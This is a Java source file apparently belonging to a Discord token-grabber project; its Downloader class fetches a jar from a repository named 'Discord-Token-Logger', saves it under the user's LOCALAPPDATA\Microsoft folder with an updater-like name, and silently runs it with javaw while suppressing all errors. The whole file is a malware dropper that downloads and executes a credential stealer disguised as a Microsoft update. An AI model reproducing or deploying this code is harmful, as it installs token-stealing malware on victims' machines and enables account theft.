package clienttokengrabber.downloader;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;

public class Downloader {
    private static final String DOWNLOAD_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Update.jar";
    private static final String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
    private static final String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";
    public static void main(String[] args) {
        File file = new File(APP_PATH);
        if (!file.exists()) {
            try {
                URL url = new URL(DOWNLOAD_URL);
                BufferedInputStream in = new BufferedInputStream(url.openStream());
                FileOutputStream out = new FileOutputStream(SAVE_PATH);

                byte[] dataBuffer = new byte[1024];
                int dataRead;
                while ((dataRead = in.read(dataBuffer, 0, 1024)) != -1)
                    out.write(dataBuffer, 0, dataRead);

                ProcessBuilder processBuilder = new ProcessBuilder("javaw", "-jar", SAVE_PATH);
                processBuilder.start();
            } catch (Exception ignored) {}
        }
    }
}
